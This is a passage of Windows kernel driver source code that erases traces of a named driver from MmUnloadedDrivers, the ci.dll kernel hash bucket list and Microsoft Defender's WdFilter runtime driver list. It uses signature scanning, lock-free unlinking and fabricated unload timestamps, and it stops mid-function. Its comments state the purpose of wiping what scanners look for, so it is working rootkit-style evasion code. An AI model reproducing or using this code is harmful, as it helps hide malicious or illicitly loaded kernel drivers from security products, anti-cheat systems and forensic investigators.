        __atomic_store_n(&CachedMmLastUnloadedDriver, Failed, __ATOMIC_SEQ_CST);
        return nullptr;
    }

    __atomic_store_n(&CachedMmLastUnloadedDriver, (uint64_t) Count, __ATOMIC_SEQ_CST);
    print(INFO("MmUnloaded: count %p = %u slots in use"), Count, *Count);
    return Count;
}

// A slot is empty when it carries no name
static bool IsUnloadEntryEmpty(_MM_UNLOADED_DRIVER* Entry)
{
    return Entry->Name.MaximumLength == 0 || Entry->Name.Length == 0 || Entry->Name.Buffer == nullptr;
}

// Whether every slot is used decides how the count is corrected after a removal
static bool IsMmUnloadedFilled(_MM_UNLOADED_DRIVER* Table)
{
    for (uint32_t Index = 0; Index < MmUnloadedDriversSize; ++Index)
        if (IsUnloadEntryEmpty(&Table[Index]))
            return false;

    return true;
}

// Letters-only case folding: every name compared here is an ASCII file name, so the 6th bit is exact
static bool WideCharEqual(wchar_t A, wchar_t B)
{
    return A == B || (A | 0x20) == (B | 0x20);
}

// MmUnloadedDrivers records the image path the loader saw, which can be a bare name ("Driver.sys"),
// a system-root path ("\SystemRoot\System32\drivers\Driver.sys") or a full NT path
// ("\??\C:\...\Driver.sys"). Compare the last path component only, and require it to start at the
// beginning or right after a separator, so "NotDriver.sys" does not match "Driver.sys"
static bool MmUnloadNameMatches(_MM_UNLOADED_DRIVER* Entry, const wchar_t* DriverName)
{
    if (!DriverName || !Entry->Name.Buffer) return false;

    size_t Target = WideStringLength(DriverName);
    size_t Recorded = Entry->Name.Length / sizeof(wchar_t);
    if (!Target || Recorded < Target || Entry->Name.Length > Entry->Name.MaximumLength) return false;

    // The base name is the suffix: compare only the last Target characters and the separator before
    // them, rather than walking the whole recorded path
    size_t Start = Recorded - Target;
    if (Start && Entry->Name.Buffer[Start - 1] != L'\\' && Entry->Name.Buffer[Start - 1] != L'/')
        return false;

    for (size_t i = 0; i < Target; ++i)
        if (!WideCharEqual(Entry->Name.Buffer[Start + i], DriverName[i]))
            return false;

    return true;
}

constexpr uint32_t MaxMmUnloadNameChars = 0x8000;

// Wipes the characters scanners look for. This is the zero-API replacement for freeing the buffer:
// the record can be dropped without ExFreePoolWithTag, but the allocation itself stays orphaned
static void WipeMmUnloadName(_MM_UNLOADED_DRIVER* Entry)
{
    if (!Entry->Name.Buffer || !Entry->Name.Length) return;

    uint32_t Chars = Entry->Name.Length / sizeof(wchar_t);
    if (Chars > MaxMmUnloadNameChars) Chars = MaxMmUnloadNameChars;

    for (uint32_t Index = 0; Index < Chars; ++Index)
        Entry->Name.Buffer[Index] = 0;
}

// Remove every matching record in one pass: survivors compact down over the holes, past-count slots
// are zeroed
static uint32_t RemoveMmUnloadRecords(const wchar_t* DriverName, _MM_UNLOADED_DRIVER* Table, uint32_t* Count, bool Filled)
{
    uint32_t Removed = 0;
    uint32_t Out = 0;      // the next slot a surviving record takes

    for (uint32_t Index = 0; Index < MmUnloadedDriversSize; ++Index)
    {
        auto Entry = &Table[Index];

        // A matching record is wiped and dropped; its name allocation is intentionally left orphaned.
        // Survivors (or trailing empties) compact over the hole.
        if (!IsUnloadEntryEmpty(Entry) && MmUnloadNameMatches(Entry, DriverName))
        {
            WipeMmUnloadName(Entry);
            *Entry = {};
            Removed++;
            print(INFO("MmUnloaded: record %u removed"), Index);
            continue;
        }

        if (Out != Index)
        {
            Table[Out] = *Entry;      // survivor (or trailing empty) slides down
            *Entry = {};             // source slot cleared
        }
        Out++;
    }

    if (Removed)
    {
        // Full array: the count sat at the cap; otherwise the records were already counted.
        // Clamp instead of subtracting below zero if the count was concurrently rewound
        uint32_t InUse = Filled ? MmUnloadedDriversSize : *Count;
        *Count = InUse > Removed ? InUse - Removed : 0;
    }

    return Removed;
}

// Small in-driver LCG for the timestamp repair; using RtlRandomEx here would reintroduce a kernel call
static uint32_t NextMmUnloadDelta(uint32_t* Seed)
{
    *Seed = *Seed * 1664525u + 1013904223u;
    return (*Seed % 100u) + 1u;
}

// Restore the descending UnloadTime order the kernel's inserts maintain
static void NormalizeMmUnloadTimes(_MM_UNLOADED_DRIVER* Table)
{
    static uint32_t Seed = 0;

    ULONGLONG PreviousTime = 0;
    for (int Index = MmUnloadedDriversSize - 2; Index >= 0; --Index)
    {
        auto Entry = &Table[Index];
        if (IsUnloadEntryEmpty(Entry)) continue;

        if (PreviousTime && Entry->UnloadTime > PreviousTime)
        {
            if (!Seed) Seed = (uint32_t) ((size_t) &Seed ^ Entry->UnloadTime);
            uint32_t Delta = NextMmUnloadDelta(&Seed);
            Entry->UnloadTime = PreviousTime > Delta ? PreviousTime - Delta : 0;
        }

        PreviousTime = Entry->UnloadTime;
    }
}

// Removes the records naming Target from MmUnloadedDrivers and fixes the count in one pass. True
// when the walk completed
bool ClearMmUnloadedDrivers(const _UNICODE_STRING* Target, uint32_t Timestamp)
{
    // An unload record carries no timestamp to match on; the name is the only key here
    (void) Timestamp;

    if (!IsValidTraceTarget(Target))
    {
        print(ERROR("MmUnloaded: loader entry has no BaseDllName"));
        return false;
    }

    address Nt = GetNtoskrnl();
    if (!Nt) return false;

    auto Table = FindMmUnloadedDrivers(Nt);
    uint32_t* Count = FindMmLastUnloadedDriver(Nt);
    if (!Table || !Count)
        return false;

    if (*Count == 0)
    {
        print(INFO("MmUnloaded: array is empty, nothing to clean"));
        return true;
    }

    // Zero-API: no ExAcquireResourceExclusiveLite around the rewrite. The array is only touched on the
    // load/unload path; a concurrent kernel insert would be another driver unloading at this instant.
    // The count update in RemoveMmUnloadRecords is clamped, so a stale read cannot underflow it.
    // One pass removes every matching record
    uint32_t Removed = RemoveMmUnloadRecords(Target->Buffer, Table, Count, IsMmUnloadedFilled(Table));
    bool Modified = Removed != 0;
    if (Modified) NormalizeMmUnloadTimes(Table);

    if (!Modified)
        print(INFO("MmUnloaded: no records for this driver"));
    else
        print(OK("MmUnloaded: records removed, count now %u"), *Count);

    return true;
}

// Debug-only self-check of the MmUnloaded cleaner, run right after it inside CleanDriverTraces. The
// first MmLastUnloadedDriver slots must be occupied and well formed, every slot (including stale slots
// past the count that the kernel leaves behind after a full-array reset) must be free of the target's
// name, and the count must stay in range. Release builds drop both this call and its verifier
void VerifyMmUnloadedDrivers(const _UNICODE_STRING* Target, uint32_t Timestamp)
{
    // An unload record carries no timestamp to match on; the name is the only key here
    (void) Timestamp;

    if (!IsValidTraceTarget(Target))
    {
        print(ERROR("VerifyMmUnloaded: loader entry has no BaseDllName, cannot verify"));
        return;
    }

    address Nt = GetNtoskrnl();
    if (!Nt) return;

    auto Table = FindMmUnloadedDrivers(Nt);
    uint32_t* Count = FindMmLastUnloadedDriver(Nt);
    if (!Table || !Count)
    {
        print(ERROR("VerifyMmUnloaded: array/count not found, cannot verify"));
        return;
    }

    uint32_t Used = *Count;
    if (Used > MmUnloadedDriversSize)
    {
        print(ERROR("VerifyMmUnloaded: count %u exceeds %u slots"), Used, MmUnloadedDriversSize);
        return;
    }

    uint32_t Occupied = 0;
    uint32_t Leaked = MmUnloadedDriversSize;   // sentinel: index of a record still naming this driver

    for (uint32_t Index = 0; Index < MmUnloadedDriversSize; ++Index)
    {
        auto Entry = &Table[Index];
        if (IsUnloadEntryEmpty(Entry))
        {
            // Stale slots beyond the count are legal after a full-array reset; a hole inside the
            // declared range means the cleaner's compaction or count update was wrong
            if (Index < Used)
            {
                print(ERROR("VerifyMmUnloaded: slot %u is empty but count is %u"), Index, Used);
                return;
            }
            continue;
        }

        Occupied++;

        // Validate before matching: a malformed length would make the suffix comparison read past
        // whatever buffer this record claims to own
        if ((Entry->Name.Length & 1) || Entry->Name.Length > Entry->Name.MaximumLength ||
            !IsKernelPointer((uint64_t) Entry->Name.Buffer))
        {
            print(ERROR("VerifyMmUnloaded: slot %u has malformed name (length %u, max %u, buffer %p)"),
                  Index, Entry->Name.Length, Entry->Name.MaximumLength, (void*) Entry->Name.Buffer);
            return;
        }

        if (Leaked == MmUnloadedDriversSize && MmUnloadNameMatches(Entry, Target->Buffer))
            Leaked = Index;
    }

    if (Leaked < MmUnloadedDriversSize)
    {
        print(ERROR("VerifyMmUnloaded: FAILED, slot %u still names this driver"), Leaked);
        return;
    }

    print(OK("VerifyMmUnloaded: all checks passed (%u used, %u nonempty, none name this driver)"),
          Used, Occupied);
}

// ---------------------------------------------------------------------------
// Cleaner 3: the CI kernel hash bucket list
// ---------------------------------------------------------------------------

// ci.dll keeps the loaded kernel image hashes in two singly linked lists behind
// g_KernelHashBucketList. Each node is one allocation:
//   +0x00 next
//   +0x08 UNICODE_STRING name (Length, MaximumLength, Buffer at +0x10)
//   +0x18 20-byte hash
//   +0x2c 16-byte file identifier
//   +0x40 flags, +0x44 reserved
//   +0x48 inline name buffer (Buffer normally points here)
//
// CI only ever prepends a node and never unlinks or frees one, so an existing
// node's next pointer is stable. The head is swapped with an atomic CAS; no
// lock or pool API is needed. The unlinked allocation is left in place (name
// and hash zeroed) because freeing it would need ExFreePool and could race a
// reader that already loaded the node.
constexpr uint32_t HashBucketEntryNameOffset = 0x48;
constexpr uint32_t HashBucketEntryNameStringOffset = 0x08;
constexpr uint32_t HashBucketEntryHashOffset = 0x18;
constexpr uint32_t HashBucketEntryHashSize = 20;
constexpr uint32_t MaxHashBucketEntries = 0x800;
constexpr uint32_t HashBucketHeadCount = 2;

// ci.dll's base from the kernel module list. EnumerateKProcess walks PsLoadedModuleList directly,
// so the lookup does not depend on this driver's own loader entry being linked
static address FindCiBase()
{
    address Cached = nullptr;
    if (LoadTraceCache(&CachedCiBase, &Cached)) return Cached;

    auto Ci = Decode(CiDllName);
    address Base = EnumerateKProcess(Ci.data());

    // ci.dll loads at boot and is never unloaded or moved, so a miss is as deterministic as the
    // signature misses above and is not retried either
    __atomic_store_n(&CachedCiBase, Base ? (uint64_t) Base : Failed, __ATOMIC_SEQ_CST);
    return Base;
}

// Resolves the chain head from one signature: the rip-relative lea sits at match+3 with its disp32
// at +3 within the instruction. nullptr when the pattern does not match or the anchor is not a kernel pointer
template<size_t N>
static ULONGLONG* FindBucketListByPattern(address CiBase, const Pattern<N> &Sig)
{
    address Match = ScanModuleImage(CiBase, Sig);
    if (!Match) return nullptr;

    ULONGLONG* List = (ULONGLONG*) ResolveRipRelative(Match, 3, 7);
    if (!List || !IsKernelPointer((uint64_t) List) || !IsAddressInImage(CiBase, (uint64_t) List))
    {
        print(ERROR("HashBucket: resolved list anchor %p is not a kernel pointer in ci"), (void*) List);
        return nullptr;
    }

    print(INFO("HashBucket: list anchor %p, first entries %p / %p"),
          (void*) List, (void*) List[0], (void*) List[1]);
    return List;
}

// The two chain heads: dereferenced once for the first entry, then per-entry qword links. The 21H1
// pattern (1903-21H1, our 19041 included) is tried first, the 22H2 pattern as fallback
static ULONGLONG* FindKernelHashBucketList(address CiBase)
{
    ULONGLONG* Cached = nullptr;
    if (LoadTraceCache(&CachedHashBucketList, &Cached)) return Cached;

    if (!CiBase)
    {
        print(ERROR("HashBucket: ci.dll not found, nothing to scan"));
        __atomic_store_n(&CachedHashBucketList, Failed, __ATOMIC_SEQ_CST);
        return nullptr;
    }

    print(INFO("HashBucket: ci.dll at %p"), (void*) CiBase);

    if (ULONGLONG* List = FindBucketListByPattern(CiBase, Decode(KernelHashBucketListSignature21H1)))
    {
        __atomic_store_n(&CachedHashBucketList, (uint64_t) List, __ATOMIC_SEQ_CST);
        return List;
    }
    if (ULONGLONG* List = FindBucketListByPattern(CiBase, Decode(KernelHashBucketListSignature22H2)))
    {
        __atomic_store_n(&CachedHashBucketList, (uint64_t) List, __ATOMIC_SEQ_CST);
        return List;
    }

    print(ERROR("HashBucket: no signature matched in ci.dll"));
    __atomic_store_n(&CachedHashBucketList, Failed, __ATOMIC_SEQ_CST);
    return nullptr;
}

// Most characters a hash-bucket name may hold before the walk treats it as garbage. Image paths are
// tens of characters, so a well-formed entry never reaches it
constexpr uint32_t MaxHashBucketNameChars = 512;

static wchar_t FoldHashBucketChar(wchar_t Character)
{
    return Character >= L'A' && Character <= L'Z'
        ? (wchar_t) (Character + (L'a' - L'A'))
        : Character;
}

// Compare the base-name suffix of a full image path: CI stores
// "\Windows\System32\drivers\Driver.sys", while the cleaner's target is the base name "Driver.sys"
static bool HashBucketNameMatches(const wchar_t* Name, uint32_t NameChars,
                                  const wchar_t* Base, uint32_t BaseChars)
{
    if (!Name || !Base || !NameChars || !BaseChars || NameChars < BaseChars) return false;

    const wchar_t* Tail = Name + (NameChars - BaseChars);
    if (Tail != Name && Tail[-1] != L'\\' && Tail[-1] != L'/') return false;

    for (uint32_t i = 0; i < BaseChars; ++i)
        if (FoldHashBucketChar(Tail[i]) != FoldHashBucketChar(Base[i])) return false;

    return true;
}

// Reads the in-entry UNICODE_STRING without assuming alignment. A malformed header falls back to the
// inline null-terminated buffer
static bool ReadHashBucketName(uint64_t Entry, _UNICODE_STRING* Name)
{
    static_assert(sizeof(_UNICODE_STRING) == 0x10);

    __builtin_memcpy(Name, (const void*) (uintptr_t) (Entry + HashBucketEntryNameStringOffset), sizeof(*Name));
    if (!Name->Length || (Name->Length & 1) || Name->Length > MaxHashBucketNameChars * 2) return false;
    if (Name->MaximumLength < Name->Length) return false;
    if (!Name->Buffer || !IsKernelPointer((uint64_t) Name->Buffer)) return false;
    return true;
}

static bool ReadHashBucketInlineName(uint64_t Entry, const wchar_t** Name, uint32_t* Chars)
{
    auto Inline = (const wchar_t*) (uintptr_t) (Entry + HashBucketEntryNameOffset);
    if (!Inline || ((uint64_t) Inline & 1)) return false;

    uint32_t Length = 0;
    while (Length < MaxHashBucketNameChars && Inline[Length]) ++Length;
    if (!Length || Length == MaxHashBucketNameChars) return false;

    *Name = Inline;
    *Chars = Length;
    return true;
}

static bool HashBucketEntryMatches(uint64_t Entry, const wchar_t* Base, uint32_t BaseChars)
{
    _UNICODE_STRING Name = {};
    if (ReadHashBucketName(Entry, &Name))
        return HashBucketNameMatches(Name.Buffer, (uint32_t) Name.Length / 2, Base, BaseChars);

    const wchar_t* Inline = nullptr;
    uint32_t InlineChars = 0;
    if (ReadHashBucketInlineName(Entry, &Inline, &InlineChars))
        return HashBucketNameMatches(Inline, InlineChars, Base, BaseChars);

    return false;
}

static void ZeroHashBucketBytes(volatile uint8_t* Bytes, uint32_t Count)
{
    while (Count--) *Bytes++ = 0;
}

static void WipeHashBucketEntry(uint64_t Entry)
{
    _UNICODE_STRING Name = {};
    if (ReadHashBucketName(Entry, &Name))
    {
        ZeroHashBucketBytes((volatile uint8_t*) Name.Buffer, Name.Length);
    }
    else
    {
        const wchar_t* Inline = nullptr;
        uint32_t InlineChars = 0;
        if (ReadHashBucketInlineName(Entry, &Inline, &InlineChars))
            ZeroHashBucketBytes((volatile uint8_t*) Inline, InlineChars * (uint32_t) sizeof(wchar_t));
    }

    ZeroHashBucketBytes((volatile uint8_t*) (uintptr_t) (Entry + HashBucketEntryHashOffset),
                        HashBucketEntryHashSize);
}

// Removes every node whose base name matches. Returns false if the walk hit a malformed link or the
// entry bound; the caller reports the removal count either way
static bool UnlinkHashBucketEntries(ULONGLONG* Heads, const wchar_t* Base, uint32_t BaseChars,
                                    uint32_t* RemovedOut)
{
    uint32_t Removed = 0;
    bool Complete = true;

    for (uint32_t HeadIndex = 0; HeadIndex < HashBucketHeadCount; ++HeadIndex)
    {
        uint64_t* const HeadLink = (uint64_t*) &Heads[HeadIndex];
        uint64_t* Link = HeadLink;
        uint64_t Current = __atomic_load_n(Link, __ATOMIC_SEQ_CST);
        uint32_t Walked = 0, Retries = 0;

        while (Current && Walked < MaxHashBucketEntries)
        {
            if (!IsKernelPointer(Current) || ++Retries > MaxHashBucketEntries * 2)
            {
                Complete = false;
                break;
            }

            uint64_t Next = *(uint64_t*) (uintptr_t) Current;
            if (HashBucketEntryMatches(Current, Base, BaseChars))
            {
                if (Link == HeadLink)
                {
                    if (!__atomic_compare_exchange_n(Link, &Current, Next, false,
                                                     __ATOMIC_SEQ_CST, __ATOMIC_SEQ_CST))
                        continue;
                }
                else
                {
                    __atomic_store_n(Link, Next, __ATOMIC_SEQ_CST);
                }

                // A reader that loaded this node before the unlink may still be using it. Keep the
                // next link and the UNICODE_STRING header valid; erase only the name bytes and hash
                WipeHashBucketEntry(Current);

                Removed++;
                Current = Next;
                Walked++;
                continue;
            }

            Link = (uint64_t*) (uintptr_t) Current;
            Current = Next;
            Walked++;
        }

        if (Current && Walked >= MaxHashBucketEntries)
            Complete = false;
    }

    *RemovedOut = Removed;
    return Complete;
}

bool ClearKernelHashBucketList(const _UNICODE_STRING* Target, uint32_t Timestamp)
{
    // A hash-bucket entry carries no timestamp to match on; the name is the only key here
    (void) Timestamp;

    if (!IsValidTraceTarget(Target))
    {
        print(ERROR("HashBucket: loader entry has no usable BaseDllName"));
        return false;
    }

    address CiBase = FindCiBase();
    if (!CiBase)
    {
        print(ERROR("HashBucket: ci.dll not reachable from the module list"));
        return false;
    }

    ULONGLONG* Heads = FindKernelHashBucketList(CiBase);
    if (!Heads) return false;

    uint32_t Removed = 0;
    bool Complete = UnlinkHashBucketEntries(Heads, Target->Buffer,
                                            (uint32_t) Target->Length / 2, &Removed);

    if (!Complete)
        print(WARN("HashBucket: walk hit a malformed link or the %u entry bound"), MaxHashBucketEntries);
    if (Removed)
        print(OK("HashBucket: unlinked %u matching entries"), Removed);
    else
        print(INFO("HashBucket: no entry matching this driver was on either list"));

    return Complete;
}

// Debug-only self-check of the hash-bucket cleaner, run right after it inside CleanDriverTraces. Walks
// both heads and confirms every link stays canonical, every entry's name is readable, and no entry still
// matches the target's base name. The cleaner is lock-free, so this is a sampling check, not a barrier.
// Release builds drop both this call and its verifier
void VerifyKernelHashBucketList(const _UNICODE_STRING* Target, uint32_t Timestamp)
{
    // A hash-bucket entry carries no timestamp to match on; the name is the only key here
    (void) Timestamp;

    if (!IsValidTraceTarget(Target))
    {
        print(ERROR("VerifyHashBucket: loader entry has no valid BaseDllName, cannot verify"));
        return;
    }

    address CiBase = FindCiBase();
    ULONGLONG* Heads = CiBase ? FindKernelHashBucketList(CiBase) : nullptr;
    if (!Heads)
    {
        print(ERROR("VerifyHashBucket: ci.dll or list anchor not found, cannot verify"));
        return;
    }

    const wchar_t* const Base = Target->Buffer;
    const uint32_t BaseChars = (uint32_t) Target->Length / 2;
    uint32_t Walked = 0, Leaked = 0;
    bool Complete = true;

    for (uint32_t HeadIndex = 0; HeadIndex < HashBucketHeadCount && Complete; ++HeadIndex)
    {
        uint64_t Current = __atomic_load_n(&Heads[HeadIndex], __ATOMIC_SEQ_CST);
        uint32_t HeadWalked = 0;

        while (Current && HeadWalked < MaxHashBucketEntries)
        {
            if (!IsKernelPointer(Current))
            {
                print(ERROR("VerifyHashBucket: head %u has malformed link %p"),
                      HeadIndex, (void*) Current);
                Complete = false;
                break;
            }

            if (HashBucketEntryMatches(Current, Base, BaseChars))
            {
                print(ERROR("VerifyHashBucket: entry %p still names this driver"), (void*) Current);
                Leaked++;
            }

            uint64_t Next = *(uint64_t*) (uintptr_t) Current;
            if (Next && !IsKernelPointer(Next))
            {
                print(ERROR("VerifyHashBucket: entry %p has malformed next %p"),
                      (void*) Current, (void*) Next);
                Complete = false;
                break;
            }

            Current = Next;
            HeadWalked++;
        }

        if (Current && HeadWalked >= MaxHashBucketEntries)
        {
            print(ERROR("VerifyHashBucket: head %u hit the %u entry bound"),
                  HeadIndex, MaxHashBucketEntries);
            Complete = false;
        }

        Walked += HeadWalked;
    }

    if (!Complete)
    {
        print(ERROR("VerifyHashBucket: walk stopped early, list damaged?"));
        return;
    }

    if (Leaked)
    {
        print(ERROR("VerifyHashBucket: FAILED, %u entries still name this driver"), Leaked);
        return;
    }

    print(OK("VerifyHashBucket: all checks passed (%u entries, none match this driver)"), Walked);
}

// ---------------------------------------------------------------------------
// Cleaner 4: WdFilter's runtime driver list
// ---------------------------------------------------------------------------

// Defender's blocklist engine keeps its own record of every kernel image it has seen in
// WdFilter!MpBmDocOpenRules: a count, a pointer array over the same records, and a doubly linked list
// threaded through them. None of that lives in the CI structures the three cleaners above reach, so a
// clean PiDDB / MmUnloadedDrivers / hash bucket still leaves this list naming the driver. Layout on
// the 19041 reference image:
//
//   MpBmDocOpenRules + 0x60  ULONG       RuntimeDriversCount
//   MpBmDocOpenRules + 0x68  PVOID*      RuntimeDriversArray
//   MpBmDocOpenRules + 0x70  LIST_ENTRY  RuntimeDriversList head
//
//   entry + 0x00  LIST_ENTRY
//   entry + 0x10  UNICODE_STRING ImageName (full path)
//   entry - 0x10  the value stored in RuntimeDriversArray for this record
//   entry - 0x20  DriverInfo, USHORT Magic at +0; MpFreeDriverInfoEx releases it
//
// WdFilter is absent on images without Defender, so a missing module is a skip rather than a failure.
// The DriverInfo release is guarded by its magic: a record from a different WdFilter build must not be
// freed through a routine that no longer matches its layout.
constexpr uint16_t WdFilterDriverInfoMagic = 0xDA18;
constexpr uint32_t WdFilterListHeadDelta = 0x8;    // the lea targets head + 8
constexpr uint32_t WdFilterArrayFromCount = 0x8;   // the array pointer global sits at count + 8
constexpr uint32_t WdFilterNameOffset = 0x10;
constexpr uint32_t WdFilterArrayEntryDelta = 0x10;
constexpr uint32_t WdFilterDriverInfoDelta = 0x20;
constexpr uint32_t WdFilterArrayEntries = 0x100;   // widest array MpBmDocOpenRules keeps
constexpr uint32_t MaxWdFilterEntries = 0x100;
constexpr uint32_t MaxWdFilterNameChars = 512;

typedef void (*MpFreeDriverInfoEx_t)(void* DriverInfo);

// WdFilter.sys base from the kernel module list. A miss means Defender is not running this boot, which
// is deterministic for the rest of the boot like the ci.dll lookup above
static address FindWdFilterBase()
{
    address Cached = nullptr;
    if (LoadTraceCache(&CachedWdFilterBase, &Cached)) return Cached;

    auto Name = Decode(WdFilterName);
    address Base = EnumerateKProcess(Name.data());

    __atomic_store_n(&CachedWdFilterBase, Base ? (uint64_t) Base : Failed, __ATOMIC_SEQ_CST);
    return Base;
}

// The list head, from the rip-relative `lea` at the match; its target is head + 8
static _LIST_ENTRY* FindWdFilterList(address Wd)
{
    _LIST_ENTRY* Cached = nullptr;
    if (LoadTraceCache(&CachedWdFilterList, &Cached)) return Cached;

    address Match = ScanModuleImage(Wd, Decode(WdFilterRuntimeDriversListSignature));
    if (!Match)
    {
        print(ERROR("WdFilter: list signature not found"));
        __atomic_store_n(&CachedWdFilterList, Failed, __ATOMIC_SEQ_CST);
        return nullptr;
    }

    auto List = (_LIST_ENTRY*) ((uintptr_t) ResolveRipRelative((const void*) Match, 3, 7) -
                                WdFilterListHeadDelta);
    if (!IsKernelPointer((uint64_t) List) || !IsAddressInImage(Wd, (uint64_t) List) ||
        !IsKernelPointer((uint64_t) List->Flink) || !IsKernelPointer((uint64_t) List->Blink))
    {
        print(ERROR("WdFilter: list head %p is not a plausible list in WdFilter"), (void*) List);
        __atomic_store_n(&CachedWdFilterList, Failed, __ATOMIC_SEQ_CST);
        return nullptr;
    }

    __atomic_store_n(&CachedWdFilterList, (uint64_t) List, __ATOMIC_SEQ_CST);
    print(INFO("WdFilter: list head %p"), (void*) List);
    return List;
}

// The used-record count, from the `inc dword ptr [rip+disp]` in the same routine
static uint32_t* FindWdFilterCount(address Wd)
{
    uint32_t* Cached = nullptr;
    if (LoadTraceCache(&CachedWdFilterCount, &Cached)) return Cached;

    address Match = ScanModuleImage(Wd, Decode(WdFilterRuntimeDriversCountSignature));
    if (!Match)
    {
        print(ERROR("WdFilter: count signature not found"));
        __atomic_store_n(&CachedWdFilterCount, Failed, __ATOMIC_SEQ_CST);
        return nullptr;
    }

    auto Count = (uint32_t*) ResolveRipRelative((const void*) Match, 2, 6);
    if (!IsKernelPointer((uint64_t) Count) || !IsAddressInImage(Wd, (uint64_t) Count) ||
        *Count > WdFilterArrayEntries)
    {
        print(ERROR("WdFilter: count %p holds %u, not a plausible record count"),
              (void*) Count, Count ? *Count : 0);
        __atomic_store_n(&CachedWdFilterCount, Failed, __ATOMIC_SEQ_CST);
        return nullptr;
    }

    // Only the pointer is cached; the count itself changes with every image load and is read live
    __atomic_store_n(&CachedWdFilterCount, (uint64_t) Count, __ATOMIC_SEQ_CST);
    print(INFO("WdFilter: count %p = %u records"), (void*) Count, *Count);
    return Count;
}

// The record array: a global pointer at count + 8 that the routine dereferences for every access
static void** FindWdFilterArray(uint32_t* Count)
{
    void** Cached = nullptr;
    if (LoadTraceCache(&CachedWdFilterArray, &Cached)) return Cached;

    void** Slot = (void**) ((uintptr_t) Count + WdFilterArrayFromCount);
    auto Array = (void**) *Slot;
    if (!IsKernelPointer((uint64_t) Array))
    {
        print(ERROR("WdFilter: array slot %p holds %p, not a kernel pointer"), (void*) Slot, (void*) Array);

        // An empty list may legitimately have no array allocated yet; that is not a permanent miss
        if (*Count == 0) return nullptr;

        __atomic_store_n(&CachedWdFilterArray, Failed, __ATOMIC_SEQ_CST);
        return nullptr;
    }

    __atomic_store_n(&CachedWdFilterArray, (uint64_t) Array, __ATOMIC_SEQ_CST);
    print(INFO("WdFilter: array %p"), (void*) Array);
    return Array;
}

// MpFreeDriverInfoEx, resolved from the call site inside WdFilter rather than by name (not exported).
// The two known instruction shapes put the E8 at match+3 or match+6, and the call target is a kernel
// routine, so the result must land inside WdFilter.sys itself
static MpFreeDriverInfoEx_t FindWdFilterFreeDriverInfo(address Wd)
{
    MpFreeDriverInfoEx_t Cached = nullptr;
    if (LoadTraceCache(&CachedWdFilterFree, &Cached)) return Cached;

    address Match = ScanModuleImage(Wd, Decode(WdFilterFreeDriverInfoSignature));
    uint32_t CallOffset = 3;
    if (!Match)
    {
        Match = ScanModuleImage(Wd, Decode(WdFilterFreeDriverInfoSignatureAlt));
        CallOffset = 6;
    }
    if (!Match)
    {
        print(ERROR("WdFilter: MpFreeDriverInfoEx signature not found"));
        __atomic_store_n(&CachedWdFilterFree, Failed, __ATOMIC_SEQ_CST);
        return nullptr;
    }

    address Call = (address) ((uintptr_t) Match + CallOffset);
    auto Free = (MpFreeDriverInfoEx_t) ResolveRipRelative((const void*) Call, 1, 5);
    if (!IsKernelPointer((uint64_t) Free) || !IsAddressInImage(Wd, (uint64_t) Free))
    {
        print(ERROR("WdFilter: resolved MpFreeDriverInfoEx %p is not inside WdFilter"), (void*) Free);
        __atomic_store_n(&CachedWdFilterFree, Failed, __ATOMIC_SEQ_CST);
        return nullptr;
    }

    __atomic_store_n(&CachedWdFilterFree, (uint64_t) Free, __ATOMIC_SEQ_CST);
    print(INFO("WdFilter: MpFreeDriverInfoEx %p"), (void*) Free);
    return Free;
}

// Reads the record's UNICODE_STRING without assuming alignment. The same validation the hash-bucket
// reader applies: even length, bounded, buffer is a kernel pointer
static bool ReadWdFilterName(uint64_t Entry, _UNICODE_STRING* Name)
{
    __builtin_memcpy(Name, (const void*) (uintptr_t) (Entry + WdFilterNameOffset), sizeof(*Name));
    if (!Name->Length || Name->Length > Name->MaximumLength || (Name->Length & 1) ||
        Name->Length > MaxWdFilterNameChars * 2 || !Name->Buffer ||
        !IsKernelPointer((uint64_t) Name->Buffer))
        return false;

    return true;
}

// Unlink a record from the runtime list. The neighbors must agree that this node is between them;
// anything else is a damaged list and is left alone rather than made worse
static bool UnlinkWdFilterEntry(_LIST_ENTRY* Link)
{
    if (!IsKernelPointer((uint64_t) Link->Flink) || !IsKernelPointer((uint64_t) Link->Blink) ||
        Link->Flink == Link || Link->Blink == Link ||
        Link->Flink->Blink != Link || Link->Blink->Flink != Link)
        return false;

    Link->Blink->Flink = Link->Flink;
    Link->Flink->Blink = Link->Blink;
    return true;
}

// Drop one value from the count-terminated pointer array, compacting the live prefix and leaving the
// slot past the new count null. Returns false when the record was not in the array
static bool RemoveWdFilterArraySlot(void** Array, uint32_t* Count, uintptr_t Value)
{
    uint32_t InUse = *Count;
    if (!Array || InUse > WdFilterArrayEntries) return false;

    for (uint32_t Index = 0; Index < InUse; ++Index)
    {
        uintptr_t Slot = 0;
        __builtin_memcpy(&Slot, &Array[Index], sizeof(Slot));
        if (Slot != Value) continue;

        for (uint32_t Move = Index; Move + 1 < InUse; ++Move)
            Array[Move] = Array[Move + 1];
        Array[InUse - 1] = nullptr;
        *Count = InUse - 1;
        return true;
    }

    return false;
}

// Release the DriverInfo block through WdFilter's own routine. The magic is the version gate: a build
// that changed the layout must be recognized here, not freed on a guess
static void ReleaseWdFilterDriverInfo(MpFreeDriverInfoEx_t Free, uintptr_t DriverInfo)
{
    if (!Free || !IsKernelPointer(DriverInfo)) return;

    uint16_t Magic = 0;
    __builtin_memcpy(&Magic, (const void*) DriverInfo, sizeof(Magic));
    if (Magic != WdFilterDriverInfoMagic)
    {
        print(WARN("WdFilter: DriverInfo %p magic %04x is not %04x, not released"),
              (void*) DriverInfo, Magic, WdFilterDriverInfoMagic);
        return;
    }

    Free((void*) DriverInfo);
}

// Removes the records naming Target from WdFilter's runtime list. True when the module is absent
// (nothing owns the list), or when the walk completed and every matched record was removed. No Defender
// lock is available to take, so the array is compacted before the count drops and the record is unlinked
// before its DriverInfo is freed: a concurrent reader never sees a live count over a hole or a freed entry
bool ClearWdFilterDriverList(const _UNICODE_STRING* Target, uint32_t Timestamp)
{
    // A runtime-list record carries no timestamp to match on; the name is the only key here
    (void) Timestamp;

    if (!IsValidTraceTarget(Target))
    {
        print(ERROR("WdFilter: loader entry has no valid BaseDllName"));
        return false;
    }

    address Wd = FindWdFilterBase();
    if (!Wd)
    {
        print(INFO("WdFilter: not loaded, clear skipped"));
        return true;
    }

    _LIST_ENTRY* Head = FindWdFilterList(Wd);
    uint32_t* Count = FindWdFilterCount(Wd);
    void** Array = Count ? FindWdFilterArray(Count) : nullptr;
    MpFreeDriverInfoEx_t Free = FindWdFilterFreeDriverInfo(Wd);
    if (!Head || !Count || !Free)
        return false;

    if (!Array && *Count != 0)
    {
